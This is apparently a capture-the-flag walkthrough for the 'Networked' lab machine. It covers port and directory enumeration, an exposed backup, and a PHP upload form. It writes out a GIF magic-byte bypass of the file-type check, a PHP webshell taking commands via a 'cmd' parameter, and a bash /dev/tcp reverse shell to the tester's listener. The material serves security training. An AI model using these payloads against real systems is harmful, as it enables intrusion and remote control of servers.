# Networked

Info
* OS: Linux
* Difficulty: easy
* IP: `10.10.10.146`

Tags
* php
* magic bytes
* webshell

<!--

Required tools
* nmap
* gobuster

Other commands/tools
```
exiftool
file
```

-->

## Walkthrough

* [IppSec](http://youtube.com/watch?v=H3t3G70bakM) (video)

### Enumeration

Nmap
```bash
nmap -n -Pn -sC -sV -p- --min-rate 1000 -oA nmap.out -v 10.10.10.146

# output
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
443/tcp closed https
```

Gobuster
```bash
exa -l --sort=size --reverse /git-repos/wordlists/SecLists/Discovery/Web-Content/ | head -n 20

# php extension: see "http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16"
gobuster dir \
  -u http://10.10.10.146 \
  -w /git-repos/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt \
  -t 100 \
  -x php \
  -o gobuster.out

# output
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.146
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /git-repos/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/04/26 07:44:41 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 229]
/uploads              (Status: 301) [Size: 236] [--> http://10.10.10.146/uploads/]
/photos.php           (Status: 200) [Size: 1302]
/upload.php           (Status: 200) [Size: 169]
/lib.php              (Status: 200) [Size: 0]
/backup               (Status: 301) [Size: 235] [--> http://10.10.10.146/backup/]
```

Examine `/backup` path
```bash
# firefox and curl override "File Modification Date/Time"
wget -O backup.tar http://10.10.10.146/backup/backup.tar

exiftool backup.tar
# output
ExifTool Version Number         : 12.16
File Name                       : backup.tar
Directory                       : .
File Size                       : 10 KiB
File Modification Date/Time     : 2019:07:09 11:33:42+00:00
File Access Date/Time           : 2023:04:28 07:10:27+00:00
File Inode Change Date/Time     : 2023:04:28 07:10:27+00:00
File Permissions                : rw-r--r--
File Type                       : TAR
File Type Extension             : tar
MIME Type                       : application/x-tar
Warning                         : Unsupported file type

# list content
tar -tvf backup.tar
-rw-r--r-- root/root       229 2019-07-09 11:33 index.php
-rw-r--r-- root/root      2001 2019-07-02 11:38 lib.php
-rw-r--r-- root/root      1871 2019-07-02 12:53 photos.php
-rw-r--r-- root/root      1331 2019-07-02 12:45 upload.php

# extract content
mkdir -p backup && tar -xvf backup.tar -C backup && cd $_
```

Examine PHP files and verify image upload

* [superglobals](https://www.php.net/manual/en/language.variables.superglobals.php)
* [filesize](https://www.php.net/manual/en/function.filesize.php)

```bash
# look for input params
grep -Ri '$_' *.php
# output
lib.php:<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post" enctype="multipart/form-data">
photos.php:  if ((strpos($exploded[0], '10_10_') === 0) && (!($prefix === $_SERVER["REMOTE_ADDR"])) ) {
upload.php:if( isset($_POST['submit']) ) {
upload.php:  if (!empty($_FILES["myFile"])) {
upload.php:    $myFile = $_FILES["myFile"];
upload.php:    if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
upload.php:    //$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];
upload.php:    $name = str_replace('.','_',$_SERVER['REMOTE_ADDR']).'.'.$ext;

# lib.php: upload form
<form action="/upload.php" method="post" enctype="multipart/form-data">
  <input type="file" name="myFile">
  <br>
  <input type="submit" name="submit" value="go!">
</form>

# upload.php: filesize($_FILES['myFile']['tmp_name']) < 60000)
# filesize returns the size of the file in bytes
# 1 KB == 1024 bytes
bc
60000 / 1024
58

# random image
curl -sSL -o random.jpg https://picsum.photos/200
# terminal viewer
viu random.jpg
# upload manually
http -f POST 10.10.10.146/upload.php submit='go!' myFile@random.jpg
# verify gallery
curl -sS http://10.10.10.146/photos.php | pup 'table td img attr{src}'
# output
uploads/10_10_14_14.jpg
uploads/127_0_0_4.png
uploads/127_0_0_3.png
uploads/127_0_0_2.png
uploads/127_0_0_1.png
```

Investigate magic bytes and file types

* https://www.php.net/manual/en/function.finfo-file.php
* https://en.wikipedia.org/wiki/List_of_file_signatures
* https://blog.netspi.com/magic-bytes-identifying-common-file-formats-at-a-glance
* https://medium.com/@d.harish008/what-is-a-magic-byte-and-how-to-exploit-1e286da1c198

```bash
# upload.php: check_file_type($_FILES["myFile"]
# lib.php: @finfo_file / @mime_content_type
# lib.php: if (strpos($mime_type, 'image/') === 0)
# upload.php: $validext = array('.jpg', '.png', '.gif', '.jpeg');

file -i random.jpg 
#random.jpg: image/jpeg; charset=binary

file random.jpg 
#random.jpg: JPEG image data, Exif standard: [TIFF image data, little-endian, direntries=6, orientation=upper-left, xresolution=86, yresolution=94, resolutionunit=2], progressive, precision 8, 200x200, components 3

xxd random.jpg | head
#00000000: ffd8 ffe1 00de 4578 6966 0000 4949 2a00  ......Exif..II*.

# example executable
ELF Executable
".ELF"
0x7F 0x45 0x4C 0x46

# craft ELF
python3 -c 'print("\x7F\x45\x4C\x46")' > test-elf.txt
# verify
file test-elf.txt 
#test-elf.txt: ELF
xxd test-elf.txt 
#00000000: 7f45 4c46 0a                             .ELF.

# example image
GIF Image
"GIF87a"
0x47 0x49 0x46 0x38 0x37 0x61

# craft image
echo -n -e 'GIF87a' > test-gif.txt
# verify
file test-gif.txt 
#test-gif.txt: GIF image data, version 87a,
xxd test-gif.txt 
#00000000: 4749 4638 3761                           GIF87a
```

Circumvent file type protection and upload PHP webshell
```bash
echo -n -e 'GIF87a <?php print("Hello World"); ?>' > test.php.gif

# verify
file test.php.gif 
#test.php.gif: GIF image data, version 87a, 15392 x 28735

# upload
http -f POST 10.10.10.146/upload.php submit='go!' myFile@test.php.gif

# verify (name is ip address of request)
curl -sS http://10.10.10.146/uploads/10_10_14_14.php.gif

# webshell
echo -n -e 'GIF87a <?php system($_GET['cmd']); ?>' > webshell.php.gif
echo -n -e 'GIF87a <?php system($_REQUEST['cmd']); ?>' > webshell.php.gif

# upload
http -f POST 10.10.10.146/upload.php submit='go!' myFile@webshell.php.gif
# list
http http://10.10.10.146/photos.php | pup 'table td img attr{src}'
# request
http 10.10.10.146/uploads/10_10_14_14.php.gif?cmd=whoami
# GIF87a apache
http 10.10.10.146/uploads/10_10_14_14.php.gif?cmd=id
# GIF87a uid=48(apache) gid=48(apache) groups=48(apache)

# url encode payload
jq --raw-output --null-input --arg VALUE "bash -i >& /dev/tcp/10.10.14.14/4242 0>&1" '$VALUE|@uri'
#bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.14%2F4242%200%3E%261
urlencode "bash -i >& /dev/tcp/10.10.14.14/4242 0>&1"
#bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.14%2F4242+0%3E%261

# listen
nc -lvnp 4242
# open reverse shell
http 10.10.10.146/uploads/10_10_14_14.php.gif?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.14%2F4242%200%3E%261
http 10.10.10.146/uploads/10_10_14_14.php.gif?cmd=bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.14%2F4242+0%3E%261
```
